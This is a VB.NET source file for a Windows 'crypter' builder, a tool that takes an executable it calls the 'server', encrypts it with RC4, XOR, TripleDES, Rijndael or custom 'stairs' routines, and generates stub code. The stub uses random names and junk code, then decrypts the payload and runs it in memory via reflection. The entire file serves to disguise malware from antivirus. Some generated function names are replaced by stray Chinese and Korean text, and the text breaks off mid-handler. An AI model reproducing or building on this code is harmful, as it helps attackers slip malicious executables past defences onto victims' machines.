﻿Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.Devices
Imports Microsoft.Win32
Imports System.IO
Imports System.Security
Imports System.Text
Imports System.Security.Cryptography

Public Class Form1

    Dim Strr1 As String = MAgedketgenerater.GetUniqueKey(30)
    Dim Strr2 As String = MAgedketgenerater.GetUniqueKey(30)
    Dim Strr3 As String = MAgedketgenerater.GetUniqueKey(30)
    Dim Strr4 As String = MAgedketgenerater.GetUniqueKey(30)
    Dim aaaaaaaa = IO.Path.GetDirectoryName(Application.ExecutablePath) + "\PePsi\"
    Dim fullpathfolder = IO.Path.GetDirectoryName(Application.ExecutablePath) + "\PePsi\My Project\"


    Private Sub FlatButton1_Click(sender As Object, e As EventArgs) Handles FlatButton1.Click
        Dim uniqueKey As String = EntryPoint.GetUniqueKey(&H23)
        Dim str2 As String = EntryPoint.GetUniqueKey(30)
        Dim str3 As String = EntryPoint.GetUniqueKey(&H19)


        Dim ofd As New OpenFileDialog
        ofd.Filter = "Executable|*.exe"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then FlatTextBox1.Text = ofd.FileName Else FlatTextBox1.Text = ""
        Me.TextBox5.Text = String.Concat(New String() {"sub main" & ChrW(13) & ChrW(10) & "Dim ", uniqueKey, " As System.Reflection.Assembly" & ChrW(13) & ChrW(10) & "Dim ", str2, " As System.Reflection.MethodInfo " & ChrW(13) & ChrW(10) & "Dim ", str3, " As Object " & ChrW(13) & ChrW(10), uniqueKey, " = System.Reflection.Assembly.Load(""PEPSI & MaGeD.Kh"")" & ChrW(13) & ChrW(10), str2, " = ", uniqueKey, ".EntryPoint" & ChrW(13) & ChrW(10), str3, " = ", uniqueKey, ".CreateInstance(", str2, ".Name)" & ChrW(13) & ChrW(10), str2, ".Invoke(", str3, ", Nothing)" & ChrW(13) & ChrW(10) & "End sub"})

    End Sub

    Private Sub FlatButton2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatButton2.Click
        Clipboard.Clear()
        If TextBox1.Text = "" Then
            MsgBox("No Text To Copie", MsgBoxStyle.Critical, "Information")
            Exit Sub
        End If
        Clipboard.SetText(TextBox1.Text)
        MsgBox("Copied", MsgBoxStyle.Information, "Information")
    End Sub


    Private Sub FlatButton5_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatButton5.Click


        If FlatTextBox1.Text = "" Then
            MsgBox("Please Chose Server And Click On Encrypte ", MsgBoxStyle.Critical)
        Else

            System.IO.Directory.CreateDirectory(aaaaaaaa & "My Project")


            System.IO.File.WriteAllText(aaaaaaaa + "Module1.vb", My.Resources.Module1)
            My.Computer.FileSystem.WriteAllText(aaaaaaaa + "Module1.vb", TextBox1.Text, False)




            System.IO.File.WriteAllText(aaaaaaaa + "PEPSI.vbproj", My.Resources.PEPSI)

            System.IO.File.WriteAllText(fullpathfolder + "AssemblyInfo.vb", My.Resources.AssemblyInfo)
            System.IO.File.WriteAllText(fullpathfolder + "Resources.Designer.vb", My.Resources.Resources_Designer)
            System.IO.File.WriteAllText(fullpathfolder + "Settings.Designer.vb", My.Resources.Settings_Designer)
            System.IO.File.WriteAllText(fullpathfolder + "Resources.resx", My.Resources.Res)


            MsgBox("Done :D", MsgBoxStyle.Information, "Information")

        End If

    End Sub

    Private Sub FlatButton4_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatButton4.Click
        TextBox1.Text = ""
    End Sub



    Private Sub FlatStickyButton12_Click(ByVal sender As Object, ByVal e As EventArgs)
        TextBox2.Text = GeneratePassword(True, True, False, False, RandomNumber(10, 8))
        TextBox3.Text = GeneratePassword(True, True, False, False, RandomNumber(10, 8))
    End Sub

    Private Sub FlatStickyButton13_Click(ByVal sender As Object, ByVal e As EventArgs)
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Dim num As Long
            Dim num3 As Integer = Convert.ToInt32(FlatNumeric1.Value)
            Dim text As String = FlatTextBox1.Text
            Dim writer As New StreamWriter((Application.StartupPath & "/tempo.tmp"))
            Dim length As Long = New FileInfo(FlatTextBox1.Text).Length
            Dim strArray As String() = New String((CInt(length) + 1) - 1) {}
            Dim buffer As Byte() = New Byte((CInt(length) + 1) - 1) {}
            buffer = FileToByteArray(FlatTextBox1.Text)
            length = (length - 1)
            writer.Write(String.Concat(New String() {"Public Class PEPSI & MaGeD.Kh" & vbNewLine & "Dim ", TextBox2.Text, " As String" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10) & "Sub ", TextBox2.Text, "()" & ChrW(13) & ChrW(10)}))
            Dim num4 As Long = length
            num = 0
            Do While (num <= num4)
                strArray(CInt(num)) = Conversion.Hex(buffer(CInt(num)))
                If (strArray(CInt(num)).Length = 1) Then
                    strArray(CInt(num)) = ("0" & strArray(CInt(num)))
                End If
                num = (num + 1)
            Loop
            writer.Write((ChrW(13) & ChrW(10) & TextBox2.Text & " = """ & strArray(0)))
            Dim num5 As Long = length
            num = 1
            Do While (num <= num5)
                If ((CDbl(num) Mod (CDbl(num3) / 2)) = 0) Then
                    writer.Write(String.Concat(New String() {"""" & ChrW(13) & ChrW(10), TextBox2.Text, " = ", TextBox2.Text, " & """, strArray(CInt(num))}))
                Else
                    writer.Write(strArray(CInt(num)))
                End If
                num = (num + 1)
            Loop
            writer.Write("""" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10) & "End Sub" & vbNewLine & "End Class")
            writer.Close()
            TextBox1.Text = File.ReadAllText(Application.StartupPath & "/tempo.tmp")
            File.Delete(Application.StartupPath & "/tempo.tmp")
        End If
    End Sub

    Private Sub FlatStickyButton14_Click(ByVal sender As Object, ByVal e As EventArgs)
        TextBox1.Text = ""
        TextBox1.Text = "'Coded By PEPSI & MaGeD.Kh" & vbNewLine & vbNewLine
        TextBox1.Text += "Imports System.IO.Compression" & vbNewLine
        TextBox1.Text += "Imports System.IO" & vbNewLine & vbNewLine
        TextBox1.Text += My.Resources.CompressVB
    End Sub

    Private Sub FlatStickyButton15_Click(ByVal sender As Object, ByVal e As EventArgs)

        TextBox1.Text = ""
        'Hex2Byte()
        TextBox1.Text = "'Coded By PEPSI & MaGeD.Kh" & vbNewLine & vbNewLine
        TextBox1.Text += Hex2ByteVB()
    End Sub

    Private Sub FlatStickyButton16_Click(ByVal sender As Object, ByVal e As EventArgs)
        TextBox1.Text = ""
        TextBox1.Text = "'Coded By PEPSI & MaGeD.Kh" & vbNewLine & vbNewLine
        TextBox1.Text += My.Resources.ResWritVBCode
    End Sub

    Private Sub FlatStickyButton26_Click(ByVal sender As Object, ByVal e As EventArgs)
        TextBox1.Text = ""
        TextBox1.Text = "'Coded By PEPSI & MaGeD.Kh" & vbNewLine & vbNewLine
        TextBox1.Text = "Imports System.Runtime.InteropServices" & vbNewLine
        TextBox1.Text += ResourceWriterVB()
        Form2.Show()
    End Sub

    Private Sub FlatStickyButton22_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatStickyButton22.Click

        TextBox5.Text = ""
        TextBox5.Text = JunkStringVB(FlatNumeric2.Value)
    End Sub

    Private Sub FlatStickyButton23_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatStickyButton23.Click
        TextBox5.Text = ""
        TextBox5.Text = "'Coded By PEPSI & MaGeD.Kh" & vbNewLine & vbNewLine
        TextBox5.Text += GenerateJunk(FlatNumeric3.Value)
    End Sub


    Private Sub FlatStickyButton21_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatStickyButton21.Click
        Form3.Show()
    End Sub



    Private Sub FlatButton3_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatButton3.Click
        Clipboard.Clear()
        If TextBox4.Text = "" Then
            MsgBox("No Text To Copie", MsgBoxStyle.Critical, "Information")
            Exit Sub
        End If
        Clipboard.SetText(TextBox4.Text)
        MsgBox("Copied", MsgBoxStyle.Information, "Information")
    End Sub

    Private Sub FlatButton8_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatButton8.Click
        Clipboard.Clear()
        If TextBox5.Text = "" Then
            MsgBox("No Text To Copie", MsgBoxStyle.Critical, "Information")
            Exit Sub
        End If
        Clipboard.SetText(TextBox5.Text)
        MsgBox("Copied", MsgBoxStyle.Information, "Information")
    End Sub

    Private Sub FlatButton7_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatButton7.Click
        TextBox4.Text = ""
    End Sub

    Private Sub FlatButton10_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatButton10.Click
        TextBox5.Text = ""
    End Sub

    Private Sub FlatButton6_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatButton6.Click
        Dim sfd As New SaveFileDialog ' New SaveFileDialog to chosse the server location
        sfd.Filter = "Visual Basic File|*.vb"
        If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
            File.WriteAllText(sfd.FileName, TextBox4.Text)
            MsgBox("Saved in : " & sfd.FileName, MsgBoxStyle.Information, "Information")
        End If
    End Sub

    Private Sub FlatButton9_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatButton9.Click
        Dim sfd As New SaveFileDialog ' New SaveFileDialog to chosse the server location
        sfd.Filter = "Visual Basic File|*.vb"
        If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
            File.WriteAllText(sfd.FileName, TextBox5.Text)
            MsgBox("Saved in : " & sfd.FileName, MsgBoxStyle.Information, "Information")
        End If
    End Sub

    Private Sub FlatStickyButton24_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatStickyButton24.Click
        Form3.Show()
    End Sub

    Private Sub FlatStickyButton25_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatStickyButton25.Click
        Form3.Show()
    End Sub

    Private Sub FlatButton11_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatButton11.Click
        TextBox1.Text = ""
        TextBox1.Text = Clipboard.GetText
    End Sub

    Private Sub FlatButton12_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FlatButton12.Click
        TextBox4.Text = ""
        TextBox4.Text = Clipboard.GetText
    End Sub


    Private Sub FlatStickyButton1_Click(ByVal sender As Object, ByVal e As EventArgs)

        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try

                TextBox1.Text = ""
                Dim Base = Convert.ToBase64String(System.IO.File.ReadAllBytes(FlatTextBox1.Text))
                Me.TextBox1.Text = String.Concat(New String() {"Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI & MaGeD.Kh " & ChrW(13) & ChrW(10) & "dim ", Strr2, " as string = " & """" & Base & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = Convert.FromBase64String (", Strr2, ")" & ChrW(13) & ChrW(10), Me.TextBox5.Text & ChrW(13) & ChrW(10), "End Module"})
            Catch ex As Exception

            End Try


        End If
    End Sub


    Private Function RC4Encrypt(ByVal A6 As Byte(), ByVal A7 As String) As Byte()
        Dim A1 As Byte() = System.Text.Encoding.ASCII.GetBytes(A7)
        Dim A2, A3, A4 As UInteger
        Dim A5 As UInteger() = New UInteger(255) {}
        Dim A9 As Byte() = New Byte(A6.Length - 1) {}
        For A2 = 0 To 255
            A5(A2) = A2
        Next
        For A2 = 0 To 255
            A3 = (A3 + A1(A2 Mod A1.Length) + A5(A2)) And 255
            A4 = A5(A2)
            A5(A2) = A5(A3)
            A5(A3) = A4
        Next
        A2 = 0 : A3 = 0
        For A8 = 0 To A9.Length - 1
            A2 = (A2 + 1) And 255
            A3 = (A3 + A5(A2)) And 255
            A4 = A5(A2)
            A5(A2) = A5(A3)
            A5(A3) = A4
            A9(A8) = A6(A8) Xor A5((A5(A2) + A5(A3)) And 255)
        Next
        Return A9
    End Function

    Public Function XOREncrypt(ByVal up As Byte(), ByVal BB2 As String) As Byte()
        Dim CL As Byte() = System.Text.Encoding.ASCII.GetBytes(BB2)
        Randomize()
        Dim FP As Integer = Int((255 - 0 + 1) * Rnd()) + 1
        Dim BA(up.Length) As Byte
        Dim KA As Integer
        For MP As Integer = 0 To up.Length - 1
            BA(MP) += (up(MP) Xor CL(KA)) Xor FP
            If KA = BB2.Length - 1 Then KA = 0 Else KA = KA + 1
        Next
        BA(up.Length) = 112 Xor FP
        Return BA
    End Function

    Public Shared Function Md5Encrypt(ByVal bytData() As Byte, ByVal sKey As String, Optional ByVal tMode As CipherMode = CipherMode.ECB, Optional ByVal tPadding As PaddingMode = PaddingMode.PKCS7) As Byte()
        Dim keyArray As Byte()

        Dim hashmd5 As New MD5CryptoServiceProvider()
        keyArray = hashmd5.ComputeHash(UTF8Encoding.UTF8.GetBytes(sKey))
        hashmd5.Clear()

        Dim tdes As New TripleDESCryptoServiceProvider()
        tdes.Key = keyArray
        tdes.Mode = tMode
        tdes.Padding = tPadding

        Dim cTransform As ICryptoTransform = tdes.CreateEncryptor()
        Dim resultArray As Byte() = cTransform.TransformFinalBlock(bytData, 0, bytData.Length)
        tdes.Clear()
        Return resultArray
    End Function
    Private ReadOnly key() As Byte = _
 {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, _
 15, 16, 17, 18, 19, 20, 21, 22, 23, 24}
    Private ReadOnly iv() As Byte = {33, 9, 22, 45, 11, 1, 6, 30, 15} ' ألمفتاح

    Private des As New cTripleDES(key, iv)
    Friend Class cTripleDES
        Private m_des As New TripleDESCryptoServiceProvider
        Private m_utf8 As New UTF8Encoding
        Private m_key() As Byte
        Private m_iv() As Byte

        Public Sub New(ByVal key() As Byte, ByVal iv() As Byte)
            Me.m_key = key
            Me.m_iv = iv

        End Sub

        Public Function Encrypt(ByVal input() As Byte) As Byte()
            Return Transform(input, m_des.CreateEncryptor(m_key, m_iv))
        End Function

        Private Function Transform(ByVal input() As Byte, _
            ByVal CryptoTransform As ICryptoTransform) As Byte()
            Dim memStream As MemoryStream = New MemoryStream
            Dim cryptStream As CryptoStream = New  _
                CryptoStream(memStream, CryptoTransform, _
                CryptoStreamMode.Write)
            cryptStream.Write(input, 0, input.Length)
            cryptStream.FlushFinalBlock()
            memStream.Position = 0
            Dim result(CType(memStream.Length - 1, System.Int32)) As Byte
            memStream.Read(result, 0, CType(result.Length, System.Int32))
            memStream.Close()
            cryptStream.Close()
            Return result
        End Function


    End Class
    Public Class StairsEncryption
        Public Shared Function Crypt(ByVal Data() As Byte, ByVal key() As Byte) As Byte()
            For i = 0 To (Data.Length * 2) + key.Length
                Data(i Mod Data.Length) = CByte(CInt((Data(i Mod Data.Length)) + CInt(Data((i + 1) Mod Data.Length))) Mod 256) Xor key(i Mod key.Length)
            Next
            Return Data
        End Function
    End Class

    Public Function EnC(ByVal data As Byte(), ByVal PP As String) As Byte()
        Dim H As New StairsEncryption
        Return StairsEncryption.Crypt(data, Encoding.Default.GetBytes(PP))
    End Function


    Private Function RSMEncrypt(ByVal data As Byte(), ByVal key As Byte()) As Byte()
        Dim R As New Rfc2898DeriveBytes(key, New Byte(7) {}, 1)

        Dim T As New RijndaelManaged
        T.Key = R.GetBytes(16)
        T.IV = R.GetBytes(16)

        Dim O(data.Length + 15) As Byte
        Buffer.BlockCopy(Guid.NewGuid.ToByteArray, 0, O, 0, 16)
        Buffer.BlockCopy(data, 0, O, 16, data.Length)

        Return T.CreateEncryptor.TransformFinalBlock(O, 0, O.Length)
    End Function


    Public Function RSM(ByVal Files As Byte(), ByVal k As String) As Byte()
        Return RSMEncrypt(Files, Encoding.Default.GetBytes(k))
    End Function

    Public Class PolyMorphicStairs
        Overloads Shared Function PolyCrypt(ByRef Data() As Byte, ByVal Key() As Byte, Optional ByVal ExtraRounds As UInteger = 0) As Byte()
            Array.Resize(Data, Data.Length + 1)
            Data(Data.Length - 1) = Convert.ToByte(New Random().Next(1, 255))
            For i = (Data.Length - 1) * (ExtraRounds + 1) To 0 Step -1
                Data(i Mod Data.Length) = CByte(CInt((Data(i Mod Data.Length)) + CInt(Data((i + 1) Mod Data.Length))) Mod 256) Xor Key(i Mod Key.Length)
            Next
            Return Data
        End Function

    End Class


    Public Function EnCr(ByVal data As Byte(), ByVal PP As String) As Byte()
        Dim H As New PolyMorphicStairs
        Return PolyMorphicStairs.PolyCrypt(data, Encoding.Default.GetBytes(PP))
    End Function


    Public Shared Function Encrypt(ByVal sData As String, ByVal sKey As String)
        Dim bytData() As Byte = Encoding.ASCII.GetBytes(sData)
        Return Encryptrej(bytData, sKey)
    End Function
    Public Shared Function Encryptrej(ByVal bytData As Byte(), ByVal strPass As String) As Byte()
        Dim bytResult As Byte()
        Using oRM As New Cryptography.RijndaelManaged
            oRM.KeySize = 256
            oRM.Key = GeKey(strPass)
            oRM.IV = GetIV(strPass)
            '
            Using oMS As New MemoryStream
                Using oCS As New Cryptography.CryptoStream(oMS, oRM.CreateEncryptor, Cryptography.CryptoStreamMode.Write)
                    oCS.Write(bytData, 0, bytData.Length)
                    oCS.FlushFinalBlock()
                    bytResult = oMS.ToArray()
                    oCS.Close()
                End Using
                oMS.Close()
            End Using
        End Using
        Return bytResult
    End Function

    Private Shared Function GeKey(ByVal strPass As String) As Byte()
        Dim bytResult As Byte()
        'Generate a byte array of required length as the encryption key.
        'A SHA256 hash of the passphrase has just the required length. It is used twice in a manner of self-salting.
        Using oSHA256 As New Cryptography.SHA256Managed
            Dim L1 As String = System.Convert.ToBase64String(oSHA256.ComputeHash(Encoding.UTF8.GetBytes(strPass)))
            Dim L2 As String = strPass & L1
            bytResult = oSHA256.ComputeHash(System.Text.Encoding.UTF8.GetBytes(L2))
            oSHA256.Clear()
        End Using
        Return bytResult
    End Function

    Private Shared Function GetIV(ByVal strPass As String) As Byte()
        Dim bytResult As Byte()
        'Generate a byte array of required length as the iv.
        'A MD5 hash of the passphrase has just the required length. It is used twice in a manner of self-salting.
        Using oMD5 As New Cryptography.MD5CryptoServiceProvider
            Dim L1 As String = System.Convert.ToBase64String(oMD5.ComputeHash(Encoding.UTF8.GetBytes(strPass)))
            Dim L2 As String = strPass & L1
            bytResult = oMD5.ComputeHash(System.Text.Encoding.UTF8.GetBytes(L2))
            oMD5.Clear()
        End Using
        Return bytResult
    End Function

    Private Sub FlatButton13_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton13.Click
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try

                TextBox1.Text = ""
                Dim Base = Convert.ToBase64String(System.IO.File.ReadAllBytes(FlatTextBox1.Text))
                Me.TextBox1.Text = String.Concat(New String() {"Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI & MaGeD.Kh " & ChrW(13) & ChrW(10) & "dim ", Strr2, " as string = " & """" & Base & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = Convert.FromBase64String (", Strr2, ")" & ChrW(13) & ChrW(10), Me.TextBox5.Text & ChrW(13) & ChrW(10), "End Module"})
            Catch ex As Exception

            End Try


        End If
    End Sub

    Private Sub FlatButton14_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton14.Click

        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim gzip = Convert.ToBase64String(Compression.Compress(System.IO.File.ReadAllBytes(FlatTextBox1.Text)))
                Me.TextBox1.Text = String.Concat(New String() {"Imports System.IO" & vbNewLine, "Imports System.IO.Compression" & vbNewLine, "Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI & MaGeD.Kh" & ChrW(13) & ChrW(10) & "dim ", Strr2, " as string = " & """" & gzip & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = Decompress(Convert.FromBase64String (", Strr2, ")" & ")" & ChrW(13) & ChrW(10), Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.gzip})

            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub FlatButton15_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton15.Click
        Dim RcKey As String = MAgedketgenerater.GetUniqueKey(30)


        Dim Rc = Convert.ToBase64String(RC4Encrypt(System.IO.File.ReadAllBytes(FlatTextBox1.Text), RcKey))
        Me.TextBox1.Text = String.Concat(New String() {"Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI & MaGeD.Kh" & ChrW(13) & ChrW(10) & "dim ", Strr2, " as string = " & """" & Rc & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = 余种表达谢谢的方式非常感谢用英方式文怎么说天涯问答(Convert.FromBase64String (", Strr2, ")" & "," & """", RcKey, """" & ")" & ChrW(13) & ChrW(10) & Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.RCDEC})

    End Sub

    Private Sub FlatButton16_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton16.Click
        Dim md5key As String = MAgedketgenerater.GetUniqueKey(30)
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim MD5 = Convert.ToBase64String(Md5Encrypt(System.IO.File.ReadAllBytes(FlatTextBox1.Text), md5key))
                Me.TextBox1.Text = String.Concat(New String() {"Imports System.Security.Cryptography" & ChrW(13) & ChrW(10) & "Imports System.Text" & ChrW(13) & ChrW(10) & "Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI & MaGeD.Kh And MaGeD KhOjA" & ChrW(13) & ChrW(10) & "dim ", Strr2, " as string = " & """" & MD5 & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = w常感谢涯问答外语文怎么说天涯问答外语频道余种表达谢的(Convert.FromBase64String (", Strr2, ")" & "," & """", md5key, """" & ")" & ChrW(13) & ChrW(10) & Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.MD5DEC})
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub FlatButton17_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton17.Click
        Dim xorkey As String = MAgedketgenerater.GetUniqueKey(30)

        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim Xorr = Convert.ToBase64String(XOREncrypt(System.IO.File.ReadAllBytes(FlatTextBox1.Text), xorkey))
                Me.TextBox1.Text = String.Concat(New String() {"Imports System.Security.Cryptography" & ChrW(13) & ChrW(10) & "Imports System.Text" & ChrW(13) & ChrW(10) & "Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI & MaGeD.Kh" & ChrW(13) & ChrW(10) & "dim ", Strr2, " as string = " & """" & Xorr & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = 方式非常感谢用英文怎么说天涯问答外语频道余(Convert.FromBase64String (", Strr2, ")" & "," & """", xorkey, """" & ")" & ChrW(13) & ChrW(10) & Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.XorDec})
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub FlatButton18_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton18.Click
        Dim polyrsmkey As String = MAgedketgenerater.GetUniqueKey(30)

        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim polyrsm = Convert.ToBase64String(RSM(System.IO.File.ReadAllBytes(FlatTextBox1.Text), polyrsmkey))
                Me.TextBox1.Text = String.Concat(New String() {"Imports System.Security.Cryptography" & ChrW(13) & ChrW(10) & "Imports System.Text" & ChrW(13) & ChrW(10) & "Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI & MaGeD.Kh" & ChrW(13) & ChrW(10) & "dim ", Strr2, " as string = " & """" & polyrsm & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = 료하는것을것을고는있다하지을고는만난음예수을수행하는(Convert.FromBase64String (", Strr2, ")" & "," & """", polyrsmkey, """" & ")" & ChrW(13) & ChrW(10) & Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.polyrsmDec})
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub FlatButton19_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton19.Click
        Dim Deskey As String = MAgedketgenerater.GetUniqueKey(30)

        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim Des3 = Convert.ToBase64String(des.Encrypt(System.IO.File.ReadAllBytes(FlatTextBox1.Text)))
                Me.TextBox1.Text = String.Concat(New String() {"Imports System.Security.Cryptography" & ChrW(13) & ChrW(10) & "Imports System.IO" & ChrW(13) & ChrW(10) & "Imports System.Text" & ChrW(13) & ChrW(10) & "Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI & MaGeD.Kh " & ChrW(13) & ChrW(10) & "dim ", Strr2, " as string = " & """" & Des3 & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte =  des.Decrypt(Convert.FromBase64String (", Strr2, "))" & ChrW(13) & ChrW(10) & Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.des3})
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub FlatButton20_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton20.Click
        Dim stairskey As String = MAgedketgenerater.GetUniqueKey(30)

        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim stairs = Convert.ToBase64String(EnC(System.IO.File.ReadAllBytes(FlatTextBox1.Text), stairskey))
                Me.TextBox1.Text = String.Concat(New String() {"Imports System.Security.Cryptography" & ChrW(13) & ChrW(10) & "Imports System.Text" & ChrW(13) & ChrW(10) & "Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI & MaGeD.Kh" & ChrW(13) & ChrW(10) & "dim ", Strr2, " as string = " & """" & stairs & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = Dec(Convert.FromBase64String (", Strr2, ")" & "," & """", stairskey, """" & ")" & ChrW(13) & ChrW(10) & Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.StairsDec})
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub FlatButton21_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton21.Click
        Dim REjkey As String = MAgedketgenerater.GetUniqueKey(30)
        Dim polykey As String = MAgedketgenerater.GetUniqueKey(30)
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""

                Dim a() As Byte = System.IO.File.ReadAllBytes(FlatTextBox1.Text)
                Dim rejpoly = Convert.ToBase64String(RSM(Encryptrej(a, REjkey), polykey))
                Me.TextBox1.Text = String.Concat(New String() {"Imports System.Security.Cryptography" & ChrW(13) & ChrW(10) & "Imports System.IO" & ChrW(13) & ChrW(10) & "Imports System.Text" & ChrW(13) & ChrW(10) & "Imports System.Security" & ChrW(13) & ChrW(10) & "Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI & MaGeD.Kh" & ChrW(13) & ChrW(10) & "dim ", Strr2, " as string = " & """" & rejpoly & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = RijnDael.는것을시도하고있다하지만난그음예수다하지만난님(료하는것을것을고는있다하지을고는만난음예수을수행하는(Convert.FromBase64String(", Strr2, ")" & "," & """", polykey, """" & ")" & "," & """", REjkey, """" & ")" & ChrW(13) & ChrW(10) & Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.RejKey})



            Catch ex As Exception
            End Try
        End If


    End Sub

    Private Sub FlatButton22_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton22.Click
        Dim polystairskey As String = MAgedketgenerater.GetUniqueKey(30)

        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim polystairs = Convert.ToBase64String(EnCr(System.IO.File.ReadAllBytes(FlatTextBox1.Text), polystairskey))
                Me.TextBox1.Text = String.Concat(New String() {"Imports System.Security.Cryptography" & ChrW(13) & ChrW(10) & "Imports System.Text" & ChrW(13) & ChrW(10) & "Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI & MaGeD.Kh " & ChrW(13) & ChrW(10) & "dim ", Strr2, " as string = " & """" & polystairs & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = 로를료ა시하로수생다ცა하ი료드ო로있프(Convert.FromBase64String (", Strr2, ")" & "," & """", polystairskey, """" & ")" & ChrW(13) & ChrW(10) & Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.PolyStairsDec})
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub FlatButton23_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton23.Click
        Dim stairskey As String = MAgedketgenerater.GetUniqueKey(30)
        Dim XorKey As String = MAgedketgenerater.GetUniqueKey(30)
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""

                Dim a() As Byte = System.IO.File.ReadAllBytes(FlatTextBox1.Text)
